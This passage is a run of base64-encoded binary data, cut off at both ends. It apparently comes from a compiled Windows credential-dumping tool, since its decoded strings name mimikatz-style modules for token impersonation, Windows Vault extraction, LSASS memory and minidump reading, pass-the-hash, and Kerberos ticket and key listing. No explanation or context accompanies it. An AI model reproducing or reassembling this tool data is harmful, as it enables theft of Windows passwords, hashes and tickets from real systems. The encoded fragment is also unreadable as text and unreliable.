GQAbwB3AHMAIABOAFQAIAAlAHUALgAlAHUAIABiAHUAaQBsAGQAIAAlAHUAIAAoAGEAcgBjAGgAIAB4ACUAcwApAAoAAAAAAFAAcgBpAG0AYQByAHkAAABVAG4AawBuAG8AdwBuAAAARABlAGwAZQBnAGEAdABpAG8AbgAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAAAAAAAABJAGQAZQBuAHQAaQBmAGkAYwBhAHQAaQBvAG4AAAAAAEEAbgBvAG4AeQBtAG8AdQBzAAAAAAAAAFIAZQB2AGUAcgB0ACAAdABvACAAcAByAG8AYwBlAHMAIAB0AG8AawBlAG4AAAAAAHIAZQB2AGUAcgB0AAAAAABJAG0AcABlAHIAcwBvAG4AYQB0AGUAIABhACAAdABvAGsAZQBuAAAAZQBsAGUAdgBhAHQAZQAAAEwAaQBzAHQAIABhAGwAbAAgAHQAbwBrAGUAbgBzACAAbwBmACAAdABoAGUAIABzAHkAcwB0AGUAbQAAAAAAAABEAGkAcwBwAGwAYQB5ACAAYwB1AHIAcgBlAG4AdAAgAGkAZABlAG4AdABpAHQAeQAAAAAAAAAAAHcAaABvAGEAbQBpAAAAAABUAG8AawBlAG4AIABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAgAG0AbwBkAHUAbABlAAAAAAAAAHQAbwBrAGUAbgAAAAAAAAAgACoAIABQAHIAbwBjAGUAcwBzACAAVABvAGsAZQBuACAAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwB3AGgAbwBhAG0AaQAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACAAKgAgAFQAaAByAGUAYQBkACAAVABvAGsAZQBuACAAIAA6ACAAAABuAG8AIAB0AG8AawBlAG4ACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHcAaABvAGEAbQBpACAAOwAgAE8AcABlAG4AVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAZABvAG0AYQBpAG4AYQBkAG0AaQBuAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AbABvAGMAYQBsAF8AZABvAG0AYQBpAG4AXwB1AHMAZQByAF8AZwBlAHQAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgBTAEkARAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAcwB5AHMAdABlAG0AAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABOAG8AIAB1AHMAZQByAG4AYQBtAGUAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHcAaABlAG4AIABTAFkAUwBUAEUATQAKAAAAVABvAGsAZQBuACAASQBkACAAIAA6ACAAJQB1AAoAVQBzAGUAcgAgAG4AYQBtAGUAIAA6ACAAJQBzAAoAUwBJAEQAIABuAGEAbQBlACAAIAA6ACAAAAAAACUAcwBcACUAcwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwB0AG8AawBlAG4AXwBnAGUAdABOAGEAbQBlAEQAbwBtAGEAaQBuAEYAcgBvAG0AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAGwAbwBjAGEAbABfAGQAbwBtAGEAaQBuAF8AdQBzAGUAcgBfAEMAcgBlAGEAdABlAFcAZQBsAGwASwBuAG8AdwBuAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwByAGUAdgBlAHIAdAAgADsAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAACUALQAxADAAdQAJAAAAAAAlAHMAXAAlAHMACQAlAHMAAAAAAAAAAAAJACgAJQAwADIAdQBnACwAJQAwADIAdQBwACkACQAlAHMAAAAAAAAAIAAoACUAcwApAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAXwBjAGEAbABsAGIAYQBjAGsAIAA7ACAAQwBoAGUAYwBrAFQAbwBrAGUAbgBNAGUAbQBiAGUAcgBzAGgAaQBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAlAHUACQAAACAALQA+ACAASQBtAHAAZQByAHMAbwBuAGEAdABlAGQAIAAhAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAFMAZQB0AFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAGwAbABvAHcAIABtAHUAbAB0AGkAcABsAGUAcwAgAHUAcwBlAHIAcwAAAAAAAABtAHUAbAB0AGkAcgBkAHAAAAAAAAAAAABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAG0AbwBkAHUAbABlAAAAAAB0AHMAAAAAAHQAZQByAG0AcwByAHYALgBkAGwAbAAAAFQAZQByAG0AUwBlAHIAdgBpAGMAZQAAAGQAbwBtAGEAaQBuAF8AZQB4AHQAZQBuAGQAZQBkAAAAZwBlAG4AZQByAGkAYwBfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQAAAGQAbwBtAGEAaQBuAF8AdgBpAHMAaQBiAGwAZQBfAHAAYQBzAHMAdwBvAHIAZAAAAGQAbwBtAGEAaQBuAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAAAAAABkAG8AbQBhAGkAbgBfAHAAYQBzAHMAdwBvAHIAZAAAAGcAZQBuAGUAcgBpAGMAAABCAGkAbwBtAGUAdAByAGkAYwAAAAAAAABQAGkAYwB0AHUAcgBlACAAUABhAHMAcwB3AG8AcgBkAAAAAAAAAAAAUABpAG4AIABMAG8AZwBvAG4AAAAAAAAARABvAG0AYQBpAG4AIABFAHgAdABlAG4AZABlAGQAAABEAG8AbQBhAGkAbgAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAAAAAARABvAG0AYQBpAG4AIABQAGEAcwBzAHcAbwByAGQAAABjAHIAZQBkAAAAAAAAAAAAVwBpAG4AZABvAHcAcwAgAFYAYQB1AGwAdAAvAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABtAG8AZAB1AGwAZQAAAHYAYQB1AGwAdAAAAAAAAAB2AGEAdQBsAHQAYwBsAGkAAAAAAAAAAABWYXVsdEVudW1lcmF0ZUl0ZW1UeXBlcwBWYXVsdEVudW1lcmF0ZVZhdWx0cwAAAABWYXVsdE9wZW5WYXVsdAAAVmF1bHRHZXRJbmZvcm1hdGlvbgAAAAAAVmF1bHRFbnVtZXJhdGVJdGVtcwAAAAAAVmF1bHRDbG9zZVZhdWx0AFZhdWx0RnJlZQAAAAAAAABWYXVsdEdldEl0ZW0AAAAACgBWAGEAdQBsAHQAIAA6ACAAAAAAAAAACQBJAHQAZQBtAHMAIAAoACUAdQApAAoAAAAAAAAAAAAJACAAJQAyAHUALgAJACUAcwAKAAAAAAAJAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkATABhAHMAdABXAHIAaQB0AHQAZQBuACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkARgBsAGEAZwBzACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAkACQBSAGUAcwBzAG8AdQByAGMAZQAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBJAGQAZQBuAHQAaQB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByACAAIAAgADoAIAAAAAAAAAAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAlADIAdQAgACAAIAAgACAAOgAgAAAAAAAAAAkACQAqAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABvAHIAKgAgADoAIAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdAAgADsAIABWAGEAdQBsAHQARwBlAHQASQB0AGUAbQA3ACAAOgAgACUAMAA4AHgAAAAAAAkACQBQAGEAYwBrAGEAZwBlAFMAaQBkACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdAAgADsAIABWAGEAdQBsAHQARwBlAHQASQB0AGUAbQA4ACAAOgAgACUAMAA4AHgAAAAAAAoACQAJACoAKgAqACAAJQBzACAAKgAqACoACgAAAAAACQAJAFUAcwBlAHIAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAJQBzAFwAJQBzAAAAAAAAAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBcAEwAbwBnAG8AbgBVAEkAXABQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAAAAAAAAAAAGIAZwBQAGEAdABoAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAMgAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgADEAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABTAEkARAAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAEMAbwBuAHYAZQByAHQAUwBpAGQAVABvAFMAdAByAGkAbgBnAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAkACQBQAGEAcwBzAHcAbwByAGQAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBQAEkATgAgAEMAbwBkAGUAIAAgACAAIAAgACAAIAAgADoAIAAlADAANABoA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HMAcwAtAHQAaABlAC0AaABhAHMAaAAAAAAAAABwAHQAaAAAAFMAdwBpAHQAYwBoACAAKABvAHIAIAByAGUAaQBuAGkAdAApACAAdABvACAATABTAEEAUwBTACAAbQBpAG4AaQBkAHUAbQBwACAAYwBvAG4AdABlAHgAdAAAAAAAAAAAAG0AaQBuAGkAZAB1AG0AcAAAAAAAAAAAAAAAAAAAAAAAUwB3AGkAdABjAGgAIAAoAG8AcgAgAHIAZQBpAG4AaQB0ACkAIAB0AG8AIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAIABjAG8AbgB0AGUAeAB0AAAAAAAAAAAAUwBlAGEAcgBjAGgAIABpAG4AIABMAFMAQQBTAFMAIABtAGUAbQBvAHIAeQAgAHMAZQBnAG0AZQBuAHQAcwAgAHMAbwBtAGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAAAAAABzAGUAYQByAGMAaABQAGEAcwBzAHcAbwByAGQAcwAAAAAAAAAAAAAATABpAHMAdABzACAAYQBsAGwAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHAAcgBvAHYAaQBkAGUAcgBzACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAAAAAATABpAHMAdABzACAAUwBTAFAAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAAAAcwBzAHAAAABMAGkAcwB0AHMAIABMAGkAdgBlAFMAUwBQACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAGwAaQB2AGUAcwBzAHAAAABMAGkAcwB0AHMAIABUAHMAUABrAGcAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAB0AHMAcABrAGcAAAAAAAAATABpAHMAdABzACAASwBlAHIAYgBlAHIAbwBzACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAABMAGkAcwB0AHMAIABXAEQAaQBnAGUAcwB0ACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAAAHcAZABpAGcAZQBzAHQAAABMAGkAcwB0AHMAIABMAE0AIAAmACAATgBUAEwATQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAG0AcwB2AAAAAAAAAAAAAABTAG8AbQBlACAAYwBvAG0AbQBhAG4AZABzACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMALgAuAC4AAAAAAAAAUwBlAGsAdQByAEwAUwBBACAAbQBvAGQAdQBsAGUAAABzAGUAawB1AHIAbABzAGEAAAAAAAAAAABTAHcAaQB0AGMAaAAgAHQAbwAgAFAAUgBPAEMARQBTAFMACgAAAAAAUwB3AGkAdABjAGgAIAB0AG8AIABNAEkATgBJAEQAVQBNAFAAIAA6ACAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AaQBuAGkAZAB1AG0AcAAgADsAIAA8AG0AaQBuAGkAZAB1AG0AcABmAGkAbABlAC4AZABtAHAAPgAgAGEAcgBnAHUAbQBlAG4AdAAgAGkAcwAgAG0AaQBzAHMAaQBuAGcACgAAAAAAAAAAAAAAAAAAAAAATwBwAGUAbgBpAG4AZwAgADoAIAAnACUAcwAnACAAZgBpAGwAZQAgAGYAbwByACAAbQBpAG4AaQBkAHUAbQBwAC4ALgAuAAoAAAAAAAAAAABsAHMAYQBzAHMALgBlAHgAZQAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABmAG8AdQBuAGQAIAAoAD8AKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHAASQBuAGYAbwBzAC0APgBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAgACgAJQB1ACkAIAAhAD0AIABNAEkATQBJAEsAQQBUAFoAXwBOAFQAXwBNAEEASgBPAFIAXwBWAEUAUgBTAEkATwBOACAAKAAlAHUAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBpAG4AaQBkAHUAbQBwACAAcABJAG4AZgBvAHMALQA+AFAAcgBvAGMAZQBzAHMAbwByAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAlAHUAKQAgACEAPQAgAFAAUgBPAEMARQBTAFMATwBSAF8AQQBSAEMASABJAFQARQBDAFQAVQBSAEUAXwBBAE0ARAA2ADQAIAAoACUAdQApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBpAG4AaQBkAHUAbQBwACAAdwBpAHQAaABvAHUAdAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8AUwB0AHIAZQBhAG0AIAAoAD8AKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEsAZQB5ACAAaQBtAHAAbwByAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAbwBnAG8AbgAgAGwAaQBzAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AbwBkAHUAbABlAHMAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBlAG0AbwByAHkAIABvAHAAZQBuAGkAbgBnAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEgAYQBuAGQAbABlACAAbwBuACAAbQBlAG0AbwByAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABvAGMAYQBsACAATABTAEEAIABsAGkAYgByAGEAcgB5ACAAZgBhAGkAbABlAGQACgAAAAAAAAAAAAkAJQBzACAAOgAJAAAAAAAKAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAgAEkAZAAgADoAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAUwBlAHMAcwBpAG8AbgAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAcwAgAGYAcgBvAG0AIAAlAHUACgBVAHMAZQByACAATgBhAG0AZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoACgBEAG8AbQBhAGkAbgAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoACgBTAEkARAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAByAHUAbgAAAAAAAAAAAAAAdQBzAGUAcgAJADoAIAAlAHMACgBkAG8AbQBhAGkAbgAJADoAIAAlAHMACgBwAHIAbwBnAHIAYQBtAAkAOgAgACUAcwAKAAAAYQBlAHMAMQAyADgAAAAAAEEARQBTADEAMgA4AAkAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMQAyADgAIABrAGUAeQAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADMAMgAgACgAMQA2ACAAYgB5AHQAZQBzACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMQAyADgAIABrAGUAeQAgAG8AbgBsAHkAIABzAHUAcABwAG8AcgB0AGUAZAAgAGYAcgBvAG0AIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAAoAG8AcgAgADcALwA4ACAAdwBpAHQAaAAgAGsAYgAyADgANwAxADkAOQA3ACkACgAAAGEAZQBzADIANQA2AAAAAABBAEUAUwAyADUANgAJADoAIAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADYANAAgACgAMwA